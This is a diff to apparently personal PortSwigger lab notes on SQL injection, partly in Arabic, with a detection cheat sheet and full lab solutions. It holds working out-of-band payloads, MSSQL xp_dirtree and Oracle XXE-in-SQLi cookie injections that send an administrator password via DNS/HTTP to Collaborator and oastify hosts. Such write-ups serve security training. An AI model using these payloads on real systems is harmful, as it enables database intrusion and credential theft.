@@ -1,5 +1,197 @@
 # Sqli 
 
+
+- <details>
+	<summary>SQLI</summary>
+
+	
+	# 🕵️ SQL Injection Detection & Classification Cheat Sheet
+	
+	## 1. اكتشاف وجود SQL Injection
+	
+	### Classic Tests
+	
+	-   جرّب إدخال رموز لكسر الكويري:
+	
+	    ``` sql
+	    '
+	    "
+	    --
+	    #
+	    ```
+	
+	-   لو ظهر Error → غالبًا **Error-based SQLi**
+	
+	-   لو النتيجة اتغيّرت من غير Error → ممكن **Boolean-based SQLi**
+	
+	-   لو الاستجابة بقت أبطأ (Delay) → ممكن **Time-based SQLi**
+	
+	### لو مفيش فرق واضح
+	
+	-   الاستجابة واحدة، مفيش Error أو Delay.
+	-   هنا نشك إن في **Blind SQLi**.
+	
+	------------------------------------------------------------------------
+	
+	## 2. إمتى نستخدم Out-of-Band (OAST)?
+	
+	-   لما الـ Response مبيورّيكش أي فرق.
+	-   لما الكويري يتنفذ Asynchronously (خلف الكواليس).
+	-   نحتاج نشوف التنفيذ من خلال قناة خارجية (DNS / HTTP request).
+	
+	**الفكرة**: تخلي قاعدة البيانات تبعت Request خارجي ليك. - DNS Lookup →
+	يظهر عندك في Burp Collaborator. - HTTP Request → يظهر برضه في
+	Collaborator أو سيرفرك.
+	
+	------------------------------------------------------------------------
+	
+	## 3. تحديد نوع SQLi
+	
+	  -----------------------------------------------------------------------
+	  النوع                                             العلامة
+	  ------------------------------------------------- ---------------------
+	  **Error-based**                                   رسالة خطأ واضحة
+	
+	  **Boolean-based**                                 فرق في النتيجة بين
+	                                                    True/False
+	
+	  **Time-based**                                    فرق في زمن الاستجابة
+	                                                    (sleep)
+	
+	  **Out-of-Band**                                   مفيش فرق في النتيجة
+	                                                    ولا الوقت → بس تشوف
+	                                                    اتصال خارجي
+	  -----------------------------------------------------------------------
+	
+	------------------------------------------------------------------------
+	
+	## 4. خطوات عملية
+	
+	1.  **حدد الـ Input** (URL, Cookie, Header, Form).
+	
+	2.  **جرّب Classic Payloads**:
+	
+	    ``` sql
+	    ' OR '1'='1
+	    ```
+	
+	    -   Error؟ → Error-based
+	    -   فرق في النتيجة؟ → Boolean-based
+	    -   Delay؟ → Time-based
+	
+	3.  **لو مفيش حاجة ظهرت** → جرّب **Out-of-Band Payload** (مثال: DNS
+	    lookup).
+	
+	4.  **راقب Burp Collaborator / Server Log**:
+	
+	    -   لو شفت اتصال → SQLi Confirmed ✅
+	
+	------------------------------------------------------------------------
+	
+	## 5. في حالة PortSwigger Lab
+	
+	-   الـ Query بيتنفذ **Asynchronously**.
+	-   الاستجابة مش بتتغير.
+	-   الحل الوحيد → **Out-of-Band SQLi** باستخدام Collaborator.
+	
+
+
+  </details>
+
+
+
+- <details>
+	 <summary>Out of band SQLI</summary>
+
+	
+	
+	
+	# Exploiting Blind SQL Injection using Out-of-Band (OAST) Techniques
+	
+	## 1. فكرة الهجوم
+	في بعض التطبيقات، يتم تنفيذ الاستعلام SQL بشكل غير متزامن (asynchronous).  
+	هذا يعني أن التطبيق يعالج طلب المستخدم في خيط (thread) واحد، بينما يتم تنفيذ الاستعلام في خيط آخر.  
+	بالتالي، لن تنجح الطرق التقليدية مثل:
+	- استرجاع بيانات مباشرة في الاستجابة.
+	- الاعتماد على الأخطاء.
+	- قياس وقت التنفيذ.
+	
+	لأن الاستجابة لا تتأثر مباشرة بالاستعلام.
+	
+	---
+	
+	## 2. الحل: الهجمات Out-of-Band (OAST)
+	يمكن استغلال الثغرة من خلال إجبار قاعدة البيانات على **تنفيذ تفاعل شبكي خارجي** مع سيرفر نتحكم فيه (مثل Burp Collaborator).  
+	هذا يسمح لنا:
+	- بالتأكد من وجود الحقن.
+	- أو حتى **تهريب البيانات** من خلال هذا التفاعل.
+	
+	---
+	
+	## 3. البروتوكولات المستخدمة
+	يمكن استخدام بروتوكولات متعددة، لكن الأكثر شيوعًا وفعالية هو **DNS** لأنه غالبًا غير محجوب داخل الشبكات الإنتاجية.
+	
+	---
+	
+	## 4. Burp Collaborator
+	Burp Suite Pro يوفر أداة اسمها **Burp Collaborator**:
+	- تعطيك دومين فرعي فريد.
+	- تسمح لك بمراقبة أي استعلامات DNS أو HTTP تصل من الهدف.
+	- تُظهر إذا كان هناك **تفاعل خارجي** حصل بسبب البايلود.
+	
+	---
+	
+	## 5. مثال على Microsoft SQL Server
+	حقن بسيط يجبر السيرفر على عمل استعلام DNS:
+	```sql
+	'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+	```
+	هذا يسبب Lookup على:
+	```
+	0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
+	```
+	
+	---
+	
+	## 6. استخراج البيانات (Data Exfiltration)
+	يمكن استغلال نفس الأسلوب لتهريب البيانات.  
+	مثال: جلب كلمة مرور الـ Administrator:
+	```sql
+	'; declare @p varchar(1024);
+	set @p=(SELECT password FROM users WHERE username='Administrator');
+	exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+	```
+	ينتج عنه Lookup على دومين يحتوي على كلمة المرور:
+	```
+	S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
+	```
+	
+	---
+	
+	## 7. أهمية OAST
+	- نسبة نجاح عالية.
+	- يمكن استخراج البيانات مباشرة.
+	- غالبًا أفضل من تقنيات Blind الأخرى (Time-based, Boolean-based).
+	
+	---
+	
+	## 8. الوقاية من Blind SQL Injection
+	منع هذا النوع من الهجمات يتم بنفس خطوات منع SQL Injection التقليدي:
+	- **استخدام الاستعلامات المجهزة (Parameterized Queries / Prepared Statements).**
+	- عدم دمج إدخال المستخدم مباشرة داخل الاستعلام SQL.
+	
+	
+	
+
+
+
+  </details>
+
+
+-----
+
+# **`sqli Labs`**
+
 <details>
   <summary>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</summary>
 
@@ -1111,6 +1303,57 @@ wiener = ee0as2ryc270mq7aw8ir
 
 
 
+---
+
+
+<details>
+	<summary>Lab: Blind SQL injection with out-of-band interaction</summary>
+
+
+
+```http
+GET / HTTP/2
+Host: 0a0c00a504d6b17e8011087100b00049.web-security-academy.net
+Cookie: TrackingId=9i21anLCGt7ftKQN'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//kqe26m39irpxxcvbe2vwq8yrxi39r3fs.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=Z6loZ0pQZQYFOxZDUXj5QNDj5oM2LMnE
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+```
+
+### **`the payload`**
+
+```url
+TrackingId=9i21anLCGt7ftKQN'+UNION+SELECT+EXTRACTVALUE(xmltype('
+<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
+<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//kqe26m39irpxxcvbe2vwq8yrxi39r3fs.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
+```
+
+
+<img width="1916" height="483" alt="image" src="https://github.com/user-attachments/assets/bb41b5d7-097c-49b9-8a2c-7761d89893d6" />
+
+
+
+- <details>
+   
+   <img width="812" height="623" alt="image" src="https://github.com/user-attachments/assets/0c6005a4-919a-4a22-bd6b-94fbb597f509" />
+
+ 
+  </details>
+
+
+
+ 
+</details>
 
 
 
@@ -1120,8 +1363,56 @@ wiener = ee0as2ryc270mq7aw8ir
 
 
 
+<details>
+	<summary>Lab: Blind SQL injection with out-of-band data exfiltration</summary>
 
 
+
+
+
+```http
+GET / HTTP/2
+
+Host: 0a5d00a904001c92814e203400120057.web-security-academy.net
+Cookie: TrackingId=uSdq0uCSJ0Bo21MN'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.2x0kd4arp9wf4u2tlk2exq5940aryomd.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=zahAEPB6Ls0SjsSsM8q2e3HMjPIF7gfi
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+
+
+
+```
+
+
+
+## **`payload`**
+
+```url
+Cookie: TrackingId=uSdq0uCSJ0Bo21MN'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.2x0kd4arp9wf4u2tlk2exq5940aryomd.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; 
+```
+
+
+
+
+<img width="1515" height="762" alt="image" src="https://github.com/user-attachments/assets/abc60122-0eb3-4b9a-ac53-a920a58cd44a" />
+
+**`password`**
+
+```
+ l9fegk90yhnd387imm9m
+```
+
+ 
+</details>
 
 
 
